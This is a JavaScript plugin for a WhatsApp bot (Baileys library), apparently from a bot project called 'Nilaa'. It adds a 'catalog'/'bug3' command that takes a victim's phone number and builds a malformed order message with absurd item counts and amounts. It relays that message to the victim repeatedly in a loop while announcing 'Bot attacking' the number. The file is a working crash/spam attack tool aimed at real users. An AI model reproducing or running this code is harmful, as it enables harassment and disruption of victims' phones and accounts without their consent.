/* ██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗░░░███╗░░██╗██╗██╗░░░░░░█████╗░░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝░░░████╗░██║██║██║░░░░░██╔══██╗██╔══██╗
   ██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░░░░██╔██╗██║██║██║░░░░░███████║███████║
   ██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░░░░██║╚████║██║██║░░░░░██╔══██║██╔══██║
   ██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░██╗██║░╚███║██║███████╗██║░░██║██║░░██║
   ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ 
                                    by jayarathne_technical                                         */

// ================= import modules ========================== //

const nila = require("../../events");
const { delay } = require('@adiwajshing/baileys');
const chalk = require('chalk');
const config = require('../../config');
const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = require('@adiwajshing/baileys');
const fs = require('fs');

// ================= start plugin ============================ //

nila.addCommand( 
    { pattern: ["catalog" , "bug3" ], desc: `des`, sucReact: "🦜", category: [ "tet", "normal" ] ,  },

async (m, conn , { jf }) => {



if (!m.isPrem) { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.errorMessage(config.reply.owner) }, { quoted: m } ); };

if(global.db.data.permission[user_id].spam_use.time == '0') { global.catchError = true; return await conn.sendMessage( m.from, { text: nila.errorMessage(config.reply.active) }, { quoted: m } ); }

      if(global.db.data.permission[user_id].spam_use.time == 'once') {

        global.db.data.permission[user_id].spam_use.time = '0'
      }



let victim = m.text.split("/")[0].replace(/ /g,'')

if (victim.length == 10 ) {
    victim = '94'+victim.slice(1);
}

if (victim.startsWith('+')) { 
    victim = victim.slice(1);
}

let victim2 = victim.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
// let result = await conn.onWhatsApp(victim2)
let count = m.text.split("/")[1]
let spams = ['./assets/src/Spam/text/Bug 05.txt']
let i2 = 0;

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Menu2.jpg') }, { upload: conn.waUploadToServer })
const doc = { 
key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {})},
"message": { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc", "mimetype": "application/octet-stream", "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=", "fileLength": "64455", "pageCount": 1, "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=", "fileName": `simple鈥D`, "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `漏 ...`,
"jpegThumbnail": fs.readFileSync('./Menu2.jpg'),
"orderTitle": `漏 馃構`,
"sellerJid": "593991398786@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: victim2, quoted: doc })



const sik =  await conn.sendMessage( m.from, { text: nila.infoMessage(`Bot attacking to ${victim}\n${count}M`)} , { quoted: m } )

await conn.sendMessage(m.chat, {
    react: { text: `🏴‍☠️` , key: sik.key },
})


for (let i = 0; i< count; i++){

   
conn.relayMessage(victim2, order.message, { messageId: order.key.id })

await delay (20*1000)


}





await conn.sendMessage(m.chat, {
    react: { text: `🏴‍☠️` , key: sik.key },
})


   

})